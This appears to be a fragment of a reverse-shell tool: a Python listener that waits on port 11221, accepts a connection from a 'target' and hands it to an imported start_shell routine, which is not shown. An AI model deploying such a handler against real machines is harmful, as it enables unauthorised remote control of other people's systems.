#!/usr/bin/python

import socket
import json
import struct
import readline
import utils

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 11221))
s.listen(1)
print("Listening for connections")

target, ip = s.accept()
print("Connection established from %s" % str(ip))
utils.start_shell(target,ip)
s.close()
